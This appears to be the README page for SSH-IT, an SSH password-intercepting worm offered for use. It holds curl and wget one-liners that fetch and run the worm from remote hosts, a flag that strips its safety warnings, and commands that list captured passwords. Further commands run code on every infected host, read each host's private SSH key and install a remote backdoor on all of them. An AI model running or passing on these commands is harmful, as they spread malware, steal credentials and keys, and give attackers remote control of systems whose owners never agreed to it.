---
layout: default
---

Use either one of these commands to deploy:
```shell
bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```
```shell
bash -c "$(wget --no-verbose -O- ssh-it.thc.org/x)"
```

{:refdef: style="text-align: center;"}
![Deploy-Example](deploy-example2.png)
{: refdef}

To show all captured passwords use:
```shell
~/.prng/thc_cli -r list
```
{:refdef: style="text-align: center;"}
![Deploy-Example](list-example.png)
{: refdef}


To uninstall use:
```shell
~/.prng/thc_cli -r uninstall
```

### ALPHA TESTING

This is PRE-RELEASE ALPHA STAGE for TESTING only.

Verbose mode (```THC_VERBOSE=1```) is enabled by default. The worm will stop after 2 hops (```THC_DEPTH=2```).

SETTINGS:
* ```THC_VERBOSE=1``` Display a warning when *ssh* is being intercepted (in bold red).
* ```THC_DEPTH=2``` The worm will not spread further than 2 hops away from the current host.
* ```THC_DEBUG=1``` Display debug information.
* ```THC_DEBUG_LOG=thc.log``` Output (most) debug information to ```thc.log```.

{:refdef: style="text-align: center;"}
![Verbose-Example](verbose-example.png)
{: refdef}

Take off all safety and run SSH-IT in release mode (*with no warnings*):
```shell
THC_NO_CONDOME=1 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
```

### Tips & Tricks
SSH-IT is controlled with ```thc_cli```.
```
usage: thc_cli [-hr] [command]
    -h          This help
    -r          Recursive (for all hosts)
Command:
    list       - Show passwords
    exec <cmd> - Execute <cmd> on target [e.g. thc_cli -r exec "id; date"]
    clean      - Clean logfiles and state information
    disable    - Disable interception
    uninstall  - Clean, disable and completely remove
Example: thc_cli -r list
```

#### Remote Command Execution
Executing a command on _all_ hosts
```shell
~/.prng/thc_cli -r exec 'id'
```

Retrieve the private SSH key (```id_rsa```) from _all_ hosts:
```shell
~/.prng/thc_cli -r exec 'cat .ssh/id_rsa 2>/dev/null'
```

Install a [backdoor](https://www.gsocket.io/deploy) on _all_ hosts:
```shell
~/.prng/thc_cli -r exec 'bash -c "$(curl -fsSL gsocket.io/x)"'
```

#### When HTTPS is not available
Deploy from a self-extracting shell-script [ssh-it-deploy.sh](http://nossl.segfault.net/ssh-it-deploy.sh):
```shell
# Without HTTPS 
wget --no-hsts http://nossl.segfault.net/ssh-it-deploy.sh && \
chmod 755 ssh-it-deploy.sh && \
./ssh-it-deploy.sh
```

#### Help the team
Help us fix bug and send us ```thc.log``` if a boo-boo happens:
```shell
THC_DEBUG=1 THC_DEBUG_LOG=thc.log ssh user@yourhost "id"
```

Special thanks to Gerald, BadAdvert1zer and DoctorWho for ideas and testing.

### Contact

Twitter: [https://twitter.com/hackerschoice](https://twitter.com/hackerschoice)  
Telegram: [https://t.me/thcorg](https://t.me/thcorg)  
Web: [https://www.thc.org](https://www.thc.org)  
Medium: [https://medium.com/@hackerschoice](https://medium.com/@hackerschoice)  
E-Mail: members@thc.org  


